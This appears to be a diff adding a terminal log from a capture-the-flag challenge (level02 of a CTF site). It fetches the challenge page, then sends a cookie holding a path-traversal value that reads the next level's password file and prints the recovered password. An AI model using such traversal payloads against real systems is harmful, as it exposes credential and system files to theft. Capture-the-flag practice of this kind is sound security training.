@@ -1,0 +1,20 @@
+$ curl http://ctf.stri.pe/level02.php
+	<html>
+	  <head>
+	    <title>Level02</title>
+	  </head>
+	  <body>
+	    <h1>Welcome to the challenge!</h1>
+	    <div class="main">
+	      <p>Looks like a first time user. Hello, there!</p>
+	      <form action="#" method="post">
+	        Name: <input name="name" type="text" length="40" /><br />
+	        Age: <input name="age" type="text" length="2" /><br /><br />
+	        <input type="submit" value="Submit!" />
+	      </form>
+	    </div>
+	  </body>
+	</html>
+
+$ curl -s --digest --user level02:kxlVXUvzv --cookie user_details="../../../home/level03/.password" http://ctf.stri.pe/level02.php | sed -n 's/      <p>\(.*\)/\1/p'
+	Or0m4UX07b
